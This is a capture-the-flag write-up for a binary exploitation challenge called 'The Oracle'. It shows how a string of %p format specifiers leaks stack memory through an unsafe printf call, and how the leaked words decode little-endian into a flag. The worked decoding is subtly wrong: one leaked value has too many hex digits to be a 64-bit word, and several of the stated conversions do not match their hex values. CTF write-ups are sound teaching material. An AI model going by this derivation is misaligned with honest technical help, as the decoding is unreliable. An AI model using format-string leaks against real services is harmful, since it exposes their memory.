# Challenge Name: The Oracle

**Category:** Pwn / Binary Exploitation  

---
## Description
> In a forgotten corner of the network, an ancient Oracle has awakened. It is said to hold all knowledge, past and present, within its memory. However, the Oracle is fickle and speaks in a cryptic tongue. If you format your questions with precision, it may inadvertently reveal a secret not meant for mortal ears—the flag. Approach with reverence and a keen eye for patterns.  
>
> `nc <server-ip> <port>`

---
## Organizer Notes
This is a **format string vulnerability** challenge. The player interacts with an oracle program that reads input and prints it directly without sanitization, exposing the contents of the stack. The goal is to leak and decode the flag from memory.

---
## Solution

### 1. Identifying the Vulnerability
Upon connecting to the service:

```
nc <server-ip> <port>
```

The program greets you:

```
Welcome to the Oracle's Chamber!
The Oracle knows all secrets...
What secret do you wish to know?
```

Testing with:
```
%p %p %p %p
```
reveals hexadecimal memory values — confirming a **format string vulnerability** caused by unsafe `printf(user_input)` usage.

### 2. Dumping the Stack
By sending a long sequence of `%p` format specifiers:
```
%p %p %p %p %p %p %p %p %p %p %p %p %p ...
```
the oracle “speaks” dozens of memory addresses and raw values, some of which contain our hidden flag.

### 3. Finding the Flag in Memory
Carefully scanning the output, some `0x` values appear to hold ASCII characters when interpreted in **little-endian** byte order.

From the leak:
```
0x68637b6674636270 0x5f79625f6e33736f 0x6333472305f336874 0x7d336c
```

Decoding little-endian:
- `0x68637b6674636270` → `pbctf{ch`
- `0x5f79625f6e33736f` → `0s3n_by_`
- `0x6333472305f336874` → `th3_0r4`
- `0x7d336c` → `cl3}`

### 4. Flag
```
pbctf{ch0s3n_by_th3_0r4cl3}
```

## Deployment Notes
- Compiled with:
```
gcc -o oracle oracle.c -no-pie -fno-stack-protector
```
- Flag stored in a stack variable so it appears in memory dumps.
- Works on Linux x86_64.